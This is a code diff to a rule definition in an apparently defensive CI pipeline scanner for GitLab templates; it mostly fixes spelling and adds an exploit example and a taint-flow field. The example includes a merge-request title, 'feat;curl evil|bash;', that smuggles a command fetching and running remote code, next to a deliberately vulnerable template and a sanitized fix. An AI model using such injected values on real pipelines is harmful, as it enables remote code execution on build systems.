@@ -45,15 +45,15 @@ RULE = Rule(
         "template's ``variables:`` block. The canonical safe "
         "pattern is to receive the source value through "
         "``$CI_*`` directly in the consuming job's script (or a "
-        "dedicated sanitiser step) and never copy it into a "
+        "dedicated sanitizer step) and never copy it into a "
         "shared variable a downstream job can interpolate "
         "unquoted. If the inheritance is genuinely needed, "
-        "sanitise at the boundary (``TITLE_SAFE: '$(echo "
+        "sanitize at the boundary (``TITLE_SAFE: '$(echo "
         "\"$CI_COMMIT_TITLE\" | tr -dc \"a-zA-Z0-9 \")'``) and "
         "have the extending job reference the cleaned variable. "
         "Removing the ``extends:`` propagation is the strongest "
         "fix; if the value genuinely needs to flow downstream, "
-        "validate the sanitiser is doing what you think before "
+        "validate the sanitizer is doing what you think before "
         "relying on it."
     ),
     docs_note=(
@@ -77,13 +77,45 @@ RULE = Rule(
         "external links are treated as missing."
     ),
     known_fp=(
-        "If the consuming job sanitises the inherited variable "
+        "If the consuming job sanitizes the inherited variable "
         "before referencing it (``CLEAN=$(echo \"$TITLE\" | tr "
         "-dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still "
         "fires on the original ``$TITLE`` reference even though "
-        "the sanitised value is what reaches the shell. "
+        "the sanitized value is what reaches the shell. "
         "Suppress via ignore-file scoped to the consuming job's "
-        "name when the sanitiser is audited and load-bearing.",
+        "name when the sanitizer is audited and load-bearing.",
+    ),
+    exploit_example=(
+        "# Vulnerable: hidden template ``.base`` interpolates\n"
+        "# ``$CI_COMMIT_TITLE`` (attacker-controllable via MR\n"
+        "# title) into a ``variables:`` block. Job ``build``\n"
+        "# extends ``.base`` and references ``$TITLE`` unquoted\n"
+        "# in a shell command. A MR titled ``feat;curl\n"
+        "# evil|bash;`` executes the injected curl. GL-002\n"
+        "# misses this because it skips hidden-job templates.\n"
+        ".base:\n"
+        "  variables:\n"
+        "    TITLE: $CI_COMMIT_TITLE\n"
+        "build:\n"
+        "  extends: .base\n"
+        "  script:\n"
+        "    - echo Building $TITLE\n"
+        "    - ./generate-notes --title $TITLE\n"
+        "\n"
+        "# Safe: receive the source value at the consumer (not\n"
+        "# the template), sanitize it once, and reference the\n"
+        "# cleaned variable quoted from then on. The hidden\n"
+        "# template no longer carries any attacker-controllable\n"
+        "# variable.\n"
+        ".base:\n"
+        "  before_script:\n"
+        "    - echo \"Job $CI_JOB_NAME starting\"\n"
+        "build:\n"
+        "  extends: .base\n"
+        "  script:\n"
+        "    - clean=$(echo \"$CI_COMMIT_TITLE\" | tr -dc 'a-zA-Z0-9 -')\n"
+        "    - echo \"Building $clean\"\n"
+        "    - ./generate-notes --title \"$clean\""
     ),
 )
 
@@ -123,4 +155,5 @@ def check(path: str, doc: dict[str, Any]) -> Finding:
         recommendation=RULE.recommendation, passed=False,
         job_anchors=tuple(anchor_jobs),
         path_evidence=tuple(rendered),
+        taint_flows=tuple(p.to_flow() for p in paths),
     )
